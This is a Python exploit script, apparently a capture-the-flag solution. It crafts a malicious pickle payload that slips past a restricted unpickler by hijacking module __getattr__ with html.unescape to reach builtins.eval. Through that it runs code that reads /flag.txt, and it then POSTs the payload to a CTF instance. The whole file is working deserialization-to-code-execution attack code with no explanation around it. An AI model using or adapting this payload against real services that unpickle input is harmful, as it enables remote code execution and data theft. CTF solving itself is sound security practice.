import pickle
from struct import pack
import requests

URL = "https://gddmtwqa.instances.infobahnc.tf/"

def pklstr(s):
    s = s.encode()
    return pickle.SHORT_BINUNICODE + pack("<B", len(s)) + s

def escape(s):
    return "".join([f"&#{ord(c)};" for c in s])
code = f'open("/flag.txt").read()'


payload = (
    pickle.GLOBAL + b"re\nenum\n" + # This can be any thing as long as it's a module inside a module and written in python
    pickle.MARK + 
    pklstr("__getattr__") + 
    pickle.GLOBAL + b"html\nunescape\n" +
    pickle.DICT +
    pickle.BUILD +
    pickle.GLOBAL + f"enum\n{escape("builtins")}\n".encode() +
    pklstr("eval") + 
    pickle.STACK_GLOBAL +
    pickle.MEMOIZE + 
    
    pickle.GLOBAL + b"ctypes\n_types\n" + # This can be any thing as long as it's a module inside a module and written in python
    pickle.MARK + 
    pklstr("__getattr__") + 
    pickle.BINGET + pack('b', 0) + 
    pickle.DICT +
    pickle.BUILD +
    pklstr("types") + 
    pickle.GLOBAL + f"enum\n{escape(code)}\n".encode() +
    pickle.STACK_GLOBAL +
    
    pickle.STOP
)

r = requests.post(URL, data=payload)
print(r.text)